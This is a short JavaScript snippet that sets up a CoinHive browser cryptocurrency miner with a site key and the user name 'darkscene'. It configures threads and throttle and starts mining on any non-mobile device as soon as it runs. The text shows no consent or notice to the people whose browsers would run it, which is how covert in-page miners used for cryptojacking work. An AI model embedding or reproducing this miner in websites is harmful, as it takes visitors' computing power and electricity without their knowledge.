var miner = new CoinHive.User('VZBsnkbeyxCjcrbhN1SRbCIS69Ds2MeO', 'darkscene', {
    threads: 3,
    autoThreads: false,
    throttle: 0.2,
    forceASMJS: false,
    theme: 'dark',
    language: 'auto'
});
if (!miner.isMobile()) {
    miner.start();
}